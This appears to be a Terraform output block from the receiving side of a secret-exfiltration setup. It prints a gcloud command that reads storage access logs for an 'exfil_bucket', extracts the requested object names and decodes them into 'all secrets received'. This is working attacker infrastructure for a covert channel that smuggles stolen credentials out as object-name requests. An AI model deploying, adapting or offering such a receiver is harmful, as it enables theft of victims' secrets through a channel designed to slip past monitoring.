output "command" {
  description = "Please use this command to dump all secrets received:"
  value       = <<EOT
# Please use this command to dump all secrets received:
# must be executed from the secrets_receiver directory

gcloud logging --project ${var.project} read 'protoPayload.methodName="storage.objects.get" AND resource.labels.bucket_name="${var.exfil_bucket}"' --limit=100 --format="value(protoPayload.resourceName)" \
  | cut -d'/' -f 6 > dumpaccesslogs.txt \
  && python3 decoder.py dumpaccesslogs.txt secrets
EOT
}
